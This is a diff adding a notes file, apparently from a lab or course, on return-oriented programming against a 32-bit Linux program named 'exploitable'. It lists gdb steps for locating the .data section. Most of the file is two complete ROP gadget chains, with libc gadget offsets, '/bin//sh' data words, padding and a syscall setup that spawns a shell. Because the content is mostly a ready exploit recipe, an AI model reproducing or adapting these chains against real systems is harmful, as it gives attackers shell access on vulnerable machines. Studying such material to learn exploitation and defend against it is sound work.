@@ -1,0 +1,64 @@
+Algorithm to perform ROP:
+
+Note: ROP will not work if the -static flag is used while compiling the vulnerable programs.
+
+-static flag: On systems that support dynamic linking, this prevents linking with the shared libraries. On other systems, this option has no effect. 
+https://gcc.gnu.org/onlinedocs/gcc/Link-Options.html#Link-Options
+
+1. Find the base address of .data section
+	
+	Use the following commands
+		gdb bin/rop/exploitable
+		break main
+		run aaa
+		info files
+
+
+2. Commands need to spawn a shell
+
+	--> From the ROP tutorial PDF:
+
+	Data segment: 0x0804a020 - 0x0804a028 is .data
+	Linked library segment: b7e18000-b7fc5000 r-xp 00000000 08:01 857        /lib/i386-linux-gnu/libc-2.17.so
+
+	ROP command: 0xf5160L: pop ecx ; pop eax ;;
+	Data       :"/bin" = 0x2f62696e
+	Address    : 0x4: Offset for /bin (.data base)
+	ROP command: 0x2e09fL: mov [eax] ecx ;;
+	ROP command: 0xf5160L: pop ecx ; pop eax ;;
+	Data       :"//sh" = 0x2f2f7368
+	Address    : 0x8: Offset for //sh (.data base)
+	ROP command: 0x2e09fL: mov [eax] ecx ;;
+	ROP command: 0x34964L: xor eax eax ;;
+	ROP command: 0x2e8bbL: pop ecx ; pop edx ;;
+	Padding    : 0x01010101 (To neutralize pop ecx)
+	Address    : 0xc: Offset for NULL (.data base)
+	ROP command: 0x113371L: mov [edx] eax ; xor eax eax ;;
+	ROP command: 0xff102L: pop ecx ; pop ebx ;;
+	Address    : 0xc: Offset for NULL (.data base)
+	Address    : 0x4: Offset for /bin (.data base)
+	ROP command: 0x14da28L: add eax 0xb ;;
+	ROP command: 0xbaa75L: call dword [gs:0x10] ;;
+
+	--> Mixture of paper and tutorial's algorithms:
+	Linked library segment: b7e18000-b7fc5000 r-xp 00000000 08:01 857        /lib/i386-linux-gnu/libc-2.17.so
+	return address: 0xbfffed5c
+
+	ROP command: 0xf5160L: pop ecx ; pop eax ;;
+	Data       :"/bin" = 0x2f62696e
+	Address    : End of stack
+	ROP command: 0x2e09fL: mov [eax] ecx ;;
+	ROP command: 0xf5160L: pop ecx ; pop eax ;;
+	Data       :"//sh" = 0x2f2f7368
+	Address    : End of stack (Return address + size of stack *4 ) + 4
+	ROP command: 0x2e09fL: mov [eax] ecx ;;
+	ROP command: 0x34964L: xor eax eax ;;
+	ROP command: 0x2e8bbL: pop ecx ; pop edx ;;
+	Padding    : 0x01010101 (To neutralize pop ecx)
+	Address    : End of stack + 8
+	ROP command: 0x113371L: mov [edx] eax ; xor eax eax ;;
+	ROP command: 0xff102L: pop ecx ; pop ebx ;;
+	Address    : End of stack + 8
+	Address    : End of stack
+	ROP command: 0x14da28L: add eax 0xb ;;
+	ROP command: 0xbaa75L: call dword [gs:0x10] ;;
